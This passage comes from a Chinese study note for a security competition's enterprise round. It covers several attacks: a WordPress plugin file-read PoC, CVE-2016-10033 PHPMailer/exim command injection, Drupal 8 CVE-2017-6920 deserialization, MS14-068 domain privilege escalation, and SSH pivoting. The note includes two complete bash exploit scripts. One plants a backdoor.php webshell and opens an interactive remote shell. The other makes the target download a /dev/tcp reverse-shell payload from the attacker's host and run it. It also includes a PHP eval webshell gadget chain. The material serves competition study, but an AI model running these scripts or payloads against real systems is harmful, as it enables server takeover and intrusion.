data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1NlY1dpa2kvd2luZG93cy1rZXJuZWwtZXhwbG9pdHM=\">exp 的下载</span></p>\n<h1 id=\"210-铁三真题解析之企业赛真题解析\"><a class=\"anchor\" href=\"#210-铁三真题解析之企业赛真题解析\">#</a> 2.10 铁三真题解析之企业赛真题解析</h1>\n<h2 id=\"wordpress\"><a class=\"anchor\" href=\"#wordpress\">#</a> wordpress</h2>\n<h3 id=\"wp-hide-security-enhancer-文件下载\"><a class=\"anchor\" href=\"#wp-hide-security-enhancer-文件下载\">#</a> WP Hide Security Enhancer 文件下载</h3>\n<p>Hide Security Enhancer 作为防护 WP Scan 的插件，有着查看文件的漏洞，只能查看，不能获取 webshell</p>\n<p><strong>Poc：</strong> <code>/wp-content/plugins/wp-hide-security-enhancer/router/file-process.php?action=style-clean&amp;file_path=/wp-config.php</code>  其中 <code>wp-config.php</code>  可以输入任意文件来读取下载</p>\n<h3 id=\"wp-mailer-命令执行\"><a class=\"anchor\" href=\"#wp-mailer-命令执行\">#</a> WP mailer 命令执行</h3>\n<ul>\n<li>\n<p>CVE-2016-1033 RCE 漏洞</p>\n</li>\n<li>\n<p>影响 wordpress4.6 版本 =&gt; pgpmailer 5.2.14</p>\n</li>\n<li>\n<p>phpmailer &lt; 5.2.18 RCE AVE-2016-10033</p>\n</li>\n<li>\n<p>环境 Ubuntu exim4</p>\n</li>\n<li>\n<p>原理</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 在源代码中</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$sitename</span> <span class=\"token operator\">=</span> <span class=\"token function\">strtolower</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'SERVER_NAME'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$from_email</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'wordpress@'</span><span class=\"token operator\">.</span><span class=\"token variable\">$sitename</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token variable\">$phpmailer</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">setFrom</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$from_email</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$from_name</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><p><code>$_SERVER ['SERVER_NAME']</code>  来自包中的 Host，也就是说 <code>from_email</code>  可控</p>\n</li>\n<li>\n<p>命令注入</p>\n<ul>\n<li>\n<p>phpmailer 最后调用了 sendmail</p>\n</li>\n<li>\n<p>在服务器上生成</p>\n</li>\n<li>\n<p><code>/usr/bin/sendmail -t -i -fwordpress@inject</code></p>\n</li>\n<li>\n<p>利用 comment 绕过对空格的过滤 (RFC822)</p>\n<ul>\n<li>\n<p>如：</p>\n<p>HOST:inject(tmp1 inject tmp2)</p>\n<p><code>/usr/bin/sendmail -t -i -fwordwordpress@inject(tmp1 inject tmp2)</code></p>\n</li>\n</ul>\n</li>\n<li>\n<p>获得 sendmail 的命令注入后。通常情况下</p>\n<p>-O QueueDirectory=/tmp/ -X/var/www/html/backdoor.php</p>\n<p>-X 指定写的 log 文件，造成任意文件写入，写 webshell</p>\n<p>但由于源代码中有 strtolower 函数，全部转为小写，因此该方式不能利用</p>\n<p>所以在 exim4 直接命令执行</p>\n<ul>\n<li>\n<p><code>sendmail -be '${run}{/bin/true}{true}{false}'</code></p>\n</li>\n<li>\n<p>不需要猜测网站路径直接执行命令进行写文件</p>\n</li>\n<li>\n<p>但由于没有继承系统环境变量，执行命令需要绝对路径</p>\n</li>\n<li>\n<p>在上面中，由于需要绝对路径，那么必须要用到 /</p>\n</li>\n<li>\n<p>这里利用 exim4 的变量绕过斜杠和空格限制</p>\n</li>\n<li>\n<p><code>sendmail -be '${spool_directory}'</code> = &gt; /var/spool/exim4</p>\n</li>\n<li>\n<p><code>sendmail -be '{tod_log}'</code>  = &gt; 返回本地时间如 <code>2022-08-30 20:39:40</code></p>\n</li>\n<li>\n<p>字符串切割 '/' = &gt;  <code>{substr{0}{1}{spool_directory}}</code></p>\n</li>\n<li>\n<p>字符串切割 ' ' = &gt;  <code>{substr{10}{1}{tod_log}}</code></p>\n</li>\n<li>\n<p>最终需要执行的命令为</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">sendmail</span> <span class=\"token parameter variable\">-be</span> <span class=\"token string\">'${run{/bin/touch /tmp/test}'</span> <span class=\"token comment\">#在 tmp 创建 test 文件</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">sendmail</span> <span class=\"token parameter variable\">-be</span> <span class=\"token string\">'${run{${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}touch${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}tmp${substr{0}{1}{$spool_directory}}test}'</span></pre></td></tr></tbody></table></figure></li>\n<li>\n<p>漏洞触发点 (/wp-admin,lost password 选项，，输入 email 点击后会执行 sendmail)</p>\n</li>\n</ul>\n</li>\n<li>\n<p>漏洞 poc</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>#!/bin/bash</pre></td></tr><tr><td data-num=\"2\"></td><td><pre># CVE-2016-10033 exploit by opsxcq</pre></td></tr><tr><td data-num=\"3\"></td><td><pre># https://github.com/opsxcq/exploit-CVE-2016-10033</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>echo '[+] CVE-2016-10033 exploit by opsxcq'</pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>if [ -z \"$1\" ]</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>then</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    echo '[-] Please inform an host as parameter'</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    exit -1</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>fi</pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>if [ $(uname) == 'Darwin' ]</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>then</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    decoder='base64 -D'</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>elif [ $(uname) == 'Linux' ]</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>then</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    decoder='base64 -d'  </pre></td></tr><tr><td data-num=\"19\"></td><td><pre>else</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    echo '[-] Your platform isnt supported: '$(uname)</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    exit -1</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>fi</pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>host=$1</pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>echo '[+] Exploiting '$host</pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>curl -sq 'http://'$host -H 'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryzXJpHSq4mNy35tHe' --data-binary $'------WebKitFormBoundaryzXJpHSq4mNy35tHe\\r\\nContent-Disposition: form-data; name=\"action\"\\r\\n\\r\\nsubmit\\r\\n------WebKitFormBoundaryzXJpHSq4mNy35tHe\\r\\nContent-Disposition: form-data; name=\"name\"\\r\\n\\r\\n&lt;?php echo \"|\".base64_encode(system(base64_decode($_GET[\"cmd\"]))).\"|\"; ?&gt;\\r\\n------WebKitFormBoundaryzXJpHSq4mNy35tHe\\r\\nContent-Disposition: form-data; name=\"email\"\\r\\n\\r\\n\\\"vulnerables\\\\\\\" -OQueueDirectory=/tmp -X/www/backdoor.php server\\\" @test.com\\r\\n------WebKitFormBoundaryzXJpHSq4mNy35tHe\\r\\nContent-Disposition: form-data; name=\"message\"\\r\\n\\r\\nPwned\\r\\n------WebKitFormBoundaryzXJpHSq4mNy35tHe--\\r\\n' &gt;/dev/null &amp;&amp; echo '[+] Target exploited, acessing shell at http://'$host'/backdoor.php'</pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>echo '[+] Checking if the backdoor was created on target system'</pre></td></tr><tr><td data-num=\"33\"></td><td><pre>code=$(curl -o /dev/null --silent --head --write-out '%{http_code}\\n' \"http://$host/backdoor.php\")</pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>if [ \"$code\" != \"200\" ]</pre></td></tr><tr><td data-num=\"36\"></td><td><pre>then</pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    echo '[-] Target cant be exploited'</pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    exit -1</pre></td></tr><tr><td data-num=\"39\"></td><td><pre>else</pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    echo '[+] Backdoor.php found on remote system'</pre></td></tr><tr><td data-num=\"41\"></td><td><pre>fi</pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>cmd='whoami'</pre></td></tr><tr><td data-num=\"44\"></td><td><pre>while [ \"$cmd\" != 'exit' ]</pre></td></tr><tr><td data-num=\"45\"></td><td><pre>do</pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    echo '[+] Running '$cmd</pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    if ! curl -sq http://$host/backdoor.php?cmd=$(echo -ne $cmd | base64) | grep '|' | grep -v 'base64_encode' | head -n 1 | cut -d '|' -f 2 | $decoder </pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    then</pre></td></tr><tr><td data-num=\"49\"></td><td><pre>        echo '[-] Connection problens'</pre></td></tr><tr><td data-num=\"50\"></td><td><pre>        exit -1</pre></td></tr><tr><td data-num=\"51\"></td><td><pre>    fi</pre></td></tr><tr><td data-num=\"52\"></td><td><pre>    echo</pre></td></tr><tr><td data-num=\"53\"></td><td><pre>    read -p 'RemoteShell&gt; ' cmd</pre></td></tr><tr><td data-num=\"54\"></td><td><pre>done</pre></td></tr><tr><td data-num=\"55\"></td><td><pre>echo '[+] Exiting'</pre></td></tr></tbody></table></figure><p>或者</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>#!/bin/bash</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>rev_host=\"本机地址\"</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>function prep_host_header () {</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\tcmd = \"$1\"</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\trce_cmd = \"\\${run {$cmd}}\";</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t# replace /with ${substr {0}{1}{$spool_directory}}</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t# sed's^/^${substr {0}{1}{$spool_directory}}^g'</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\trce_cmd = \"`echo $rce_cmd | sed's^/^\\${substr {0}{1}{\\$exim_path}}^g'`\"</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t# replace ' '(space) with </pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    # sed's^ ^${substr {10}{1}{$tod_log}}$^g'</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    rce_cmd = \"`echo $rce_cmd | sed's^ ^\\${substr {10}{1}{\\$tod_log}}^g'`\"</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    # return \"target (any -froot@localhost -be $rce_cmd null)\"</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    host_header=\"a (a -be $rce_cmd p)\"</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    return 0</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>}</pre></td></tr><tr><td data-num=\"19\"></td><td><pre># a (a -be ${run {${substr {0}{1}{$exim_path}} usr${substr {0}{1}{$exim_path}} bin${substr {0}{1}{$exim_path}} curl${substr {10}{1}{$tod_log}}-o${substr {0}{1}{$exim_path}} tmp${substr {0}{1}{$exim_path}} r${substr {10}{1}{$tod_log}} 192.168.20.18${substr {0}{1}{$exim_path}} r}} p)</pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>if [  \"$=\" -ne 1 ]; then</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>echo -e \"Usage:\\n$0 target-wordpress-url\\n\"</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>exit 1</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>fi</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>target=\"$1\"</pre></td></tr><tr><td data-num=\"26\"></td><td><pre>echo -ne \"\\e [91m [*]\\033 [0m\"</pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>echo -e \"\\e [92m [*]\\033 [0m Guess I can't argue with that... Let's get started...\\n\"</pre></td></tr><tr><td data-num=\"29\"></td><td><pre># Server payload/bash script on :80</pre></td></tr><tr><td data-num=\"30\"></td><td><pre>RCE_exec_cmd=\"sleep 3 &amp;&amp; /bin/bash -i &gt;&amp; /dev/tcp/$rev_host/7777 0&gt;&amp;1\"  # r 文件的内容</pre></td></tr><tr><td data-num=\"31\"></td><td><pre>echo \"$RCE_exec_cmd\" &gt; r</pre></td></tr><tr><td data-num=\"32\"></td><td><pre>python -m SimpleHTTPServer 80 2&gt;/dev/null &gt;&amp;2 &amp;</pre></td></tr><tr><td data-num=\"33\"></td><td><pre>hpid=$!</pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre># Save payload on the target in /tmp/rce</pre></td></tr><tr><td data-num=\"36\"></td><td><pre>cmd=\"/usr/bin/curl -o/tmp/r $rev_host/r\"  # 将本机的 r 文件写到服务器的 tmp 下的 r 文件</pre></td></tr><tr><td data-num=\"37\"></td><td><pre>prep_host_header \"$cmd\"</pre></td></tr><tr><td data-num=\"38\"></td><td><pre>curl -H\"Host: $host_header\" -s -d 'user_login=galigigi&amp;wp-submit=Get+New+Password' $target/wp-login.php?action=lostpassword</pre></td></tr><tr><td data-num=\"39\"></td><td><pre>echo -e \"\\n\\e [92m [+]\\e [0m Payload sent successfully\"</pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre># Execute payload (RCE_exec_cmd) on the target /bin/bash/tmp/rce</pre></td></tr><tr><td data-num=\"42\"></td><td><pre>cmd=\"/bin/bash/tmp/r\"  # 执行 r 脚本</pre></td></tr><tr><td data-num=\"43\"></td><td><pre>prep_host_header \"$cmd\"</pre></td></tr><tr><td data-num=\"44\"></td><td><pre>curl -H\"Host: $host_header\" -d 'user_login=galigigi&amp;wp-submit=Get+New+Password' $target/wp-login.php?action=lostpassword &amp;</pre></td></tr><tr><td data-num=\"45\"></td><td><pre>echo -e \"\\n\\e [92m [+]\\033 [0m Payload executed!\"</pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>echo -e \"\\n\\e [92m [*]\\033 [0m Waiting for the target to send us a \\e [94mreverse shell\\e [0m...\\n\"</pre></td></tr><tr><td data-num=\"48\"></td><td><pre></pre></td></tr><tr><td data-num=\"49\"></td><td><pre></pre></td></tr><tr><td data-num=\"50\"></td><td><pre></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>echo \"Exiting...\"</pre></td></tr><tr><td data-num=\"52\"></td><td><pre>exit 0</pre></td></tr></tbody></table></figure></li>\n</ul>\n</li>\n</ul>\n<h2 id=\"drupal8-rce\"><a class=\"anchor\" href=\"#drupal8-rce\">#</a> Drupal8 RCE</h2>\n<ul>\n<li>\n<p>CVE-2017-6920</p>\n</li>\n<li>\n<p>影响 Drupal8 core 8.3.3</p>\n</li>\n<li>\n<p>yaml 扩展导致的反序列化漏洞</p>\n</li>\n<li>\n<p>需要后台登陆</p>\n</li>\n</ul>\n<p>原理</p>\n<ul>\n<li>\n<p><code>yamlparse()</code>  可以传参数</p>\n</li>\n<li>\n<p>通过 <code>!php/object</code>  来声明一个节点，以 <code>unserialize</code>  方式处理</p>\n</li>\n<li>\n<p>需要安装 yaml 扩展</p>\n</li>\n<li>\n<p>外部可控输入点 ConfigSingleImportForm.php 引入配置</p>\n</li>\n</ul>\n<p>步骤</p>\n<ul>\n<li>寻找可以利用的类</li>\n<li>FileCookieJar.php 写入 webshell</li>\n<li>WindowsPipes.php 任意文件删除</li>\n<li>FnStream.php 无参数函数执行</li>\n</ul>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token package\">GuzzleHttp<span class=\"token punctuation\">\\</span>Psr7</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">FnStream</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token keyword type-hint\">array</span> <span class=\"token variable\">$methods</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">methods</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$methods</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token comment\">// Create the functions on the class</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">foreach</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$methods</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$name</span> <span class=\"token operator\">=&gt;</span> <span class=\"token variable\">$fn</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>      <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token punctuation\">{</span><span class=\"token string single-quoted-string\">'_fn_'</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$name</span><span class=\"token punctuation\">}</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$fn</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">_fn_close</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>      <span class=\"token function\">call_user_func</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">_fn_close</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token variable\">$fn</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">FnStream</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'close'</span><span class=\"token operator\">=&gt;</span><span class=\"token string single-quoted-string\">'phpinfo'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$fn</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token delimiter important\">?&gt;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>!php/object \"O:24:\\\"GuzzleHttp\\\\Psr7\\\\FnStream\\\":2:{s:33:\\\"\\0GuzzleHttp\\\\Psr7\\\\FnStream\\0methods\\\";a:1:{s:5:\\\"close\\\";s:7:\\\"phpinfo\\\";}s:9:\\\"_fn_close\\\";s:7:\\\"phpinfo\\\";}\"</pre></td></tr></tbody></table></figure><p><img data-src=\"../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/2.10_1.jpg\" alt=\"\"></p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>$cookie_jar = new FileCookieJar(\"/var/www/html/drupal8/shell.php\");</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>$cookie = array(\"a\" =&gt; \"<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span>$<span class=\"token string double-quoted-string\">\".\"</span><span class=\"token constant\">_POST</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?&gt;</span></span>\",\"Name\" =&gt; \"123a\", \"Value\" =&gt; '0', \"Domain\" =&gt; 'a', 'Path' =&gt; 'a', 'Expires' =&gt; 123456);</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>$ab = new SetCookie($cookie);</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>$asb = $cookie_jar-&gt;setCookie($ab);</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>file_put_contents(\"ddd\",addslashes(serialize($cookie_jar)));</pre></td></tr></tbody></table></figure><p>先登录</p>\n<p>漏洞触发点</p>\n<ul>\n<li>/admin/config/development/configuration/single/import</li>\n<li>之后添加 payload 即可</li>\n</ul>\n<h2 id=\"域权限提升漏洞\"><a class=\"anchor\" href=\"#域权限提升漏洞\">#</a> 域权限提升漏洞</h2>\n<ul>\n<li>\n<p>MS14-068</p>\n</li>\n<li>\n<p>通过普通用户用户伪造凭证登录管理员机器</p>\n</li>\n<li>\n<p>需要条件：</p>\n<ul>\n<li>普通域的用户名和密码</li>\n<li>域控的域名</li>\n<li>时间日期同步</li>\n<li>dns 指向域内的 dns 或修改 hosts 文件</li>\n<li><code>apt-get install krb-user</code></li>\n</ul>\n</li>\n<li>\n<p><code>nmap ip -p445 --script=smb-os-discovery</code></p>\n</li>\n<li>\n<p>年月日和时间都需要同步</p>\n<p><code>net time -S &lt;ip&gt;</code>  确认域时间</p>\n<p><code>date -s</code></p>\n</li>\n<li>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL2dsb2RlblBhYy5weQ==\">glodenPac.py</span></p>\n<p>-target-ip -dc-ip</p>\n<p><code>domain.com/kaka (用户名):Bomb123 (密码)@&lt;域控主机名 (前面通过 nmap 扫出来的 FQDN)&gt;.domain.com</code></p>\n</li>\n</ul>\n<p>相关链接:</p>\n<ul>\n<li>\n<p>ms14-068</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sYWJzLm13cmluZm9zZWN1cml0eS5jb20vYmxvZy9kaWdnaW5nLWludG8tbXMxNC0wNjgtZXhwbG9pdGF0aW9uLWFuZC1kZWZlbmNlLw==\">https://labs.mwrinfosecurity.com/blog/digging-into-ms14-068-exploitation-and-defence/</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudHJ1c3RlZHNlYy5jb20vMjAxNC8xMi9tczE0LTA2OC1mdWxsLWNvbXByb21pc2Utc3RlcC1zdGVwLw==\">https://www.trustedsec.com/2014/12/ms14-068-full-compromise-step-step/</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5mcmVlYnVmLmNvbS92dWxzLzU2MDgxLmh0bWw=\">http://www.freebuf.com/vuls/56081.html</span></p>\n</li>\n<li>\n<p>Wordpres RCE</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9leHBsb2l0Ym94LmlvL3Z1bG4vV29yZFByZXNzLUV4cGxvaXQtNC02LVJDRS1DT0RFLUVYRUMtQ1ZFLTIwMTYtMTAwMzMuaHRtbA==\">https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html</span></p>\n</li>\n<li>\n<p>Drupal8</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wYXBlci5zZWVidWcub3JnLzMzNC8/c3BtPTUxNzYxNzc1NTg4NS4yLjI1b0hVNjM=\">https://paper.seebug.org/334/?spm=517617755885.2.25oHU63</span></p>\n</li>\n</ul>\n<h1 id=\"211-真题解析之内网渗透知识及工具使用\"><a class=\"anchor\" href=\"#211-真题解析之内网渗透知识及工具使用\">#</a> 2.11 真题解析之内网渗透知识及工具使用</h1>\n<p>企业赛代理工具和 msf</p>\n<h2 id=\"代理工具\"><a class=\"anchor\" href=\"#代理工具\">#</a> 代理工具</h2>\n<h3 id=\"socks-proxychains-ew-的使用转发\"><a class=\"anchor\" href=\"#socks-proxychains-ew-的使用转发\">#</a> socks、proxychains、ew 的使用转发</h3>\n<p>参考上面 2.8 的内网转发基础</p>\n<h3 id=\"ssh-端口转发\"><a class=\"anchor\" href=\"#ssh-端口转发\">#</a> ssh 端口转发</h3>\n<p>ssh：加密客户端和服务端的通讯数据、突破防火墙的限制</p>\n<h4 id=\"本地端口转发-攻击机上执行\"><a class=\"anchor\" href=\"#本地端口转发-攻击机上执行\">#</a> 本地端口转发 (攻击机上执行)</h4>\n<p>Hacker = &gt; A = &gt; B</p>\n<ul>\n<li>ssh -Nf -L &lt;本机地址 (可省略)&gt;:&lt; 本机端口 &gt;:&lt; 目标 B 地址 &gt;:&lt; 目标 B 端口 &gt; 跳板 IP (A)</li>\n<li>-N 为不执行命令 -f 为后台执行</li>\n</ul>\n<h3 id=\"远程端口转发-在跳板机-a-上执行\"><a class=\"anchor\" href=\"#远程端口转发-在跳板机-a-上执行\">#</a> 远程端口转发 (在跳板机 A 上执行)</h3>\n<p>Hacker = &gt; A = &gt; B</p>\n<ul>\n<li>ssh -Nf -R &lt;攻击机 IP&gt;:&lt; 攻击机端口 &gt;:&lt; 目标 B 地址 &gt;:&lt; 目标 B 端口 &gt; 攻击机 IP</li>\n</ul>\n<ul>\n<li>适用于防火墙情况不能从攻击机直接连接 A，但是 A 可以回连</li>\n</ul>\n<h3 id=\"动态端口转发-在攻击机上执行\"><a class=\"anchor\" href=\"#动态端口转发-在攻击机上执行\">#</a> 动态端口转发 (在攻击机上执行)</h3>\n<p>Hacker = &gt; A = &gt; B</p>\n<ul>\n<li>ssh -Nf -D &lt;攻击机 IP&gt;:&lt; 攻击机端口 &gt; &lt; 跳板机 A 的 IP 地址 &gt;</li>\n</ul>\n<ul>\n<li>不需要制定目标的端口和 IP 获得完全的访问</li>\n</ul>\n<h3 id=\"web-端代理工具\"><a class=\"anchor\" href=\"#web-端代理工具\">#</a> web 端代理工具</h3>\n<h4 id=\"regeorg-2\"><a class=\"anchor\" href=\"#regeorg-2\">#</a> reGeorg</h4>\n<p>见 2.8</p>\n<h3 id=\"windows-端代理工具\"><a class=\"anchor\" href=\"#windows-端代理工具\">#</a> windows 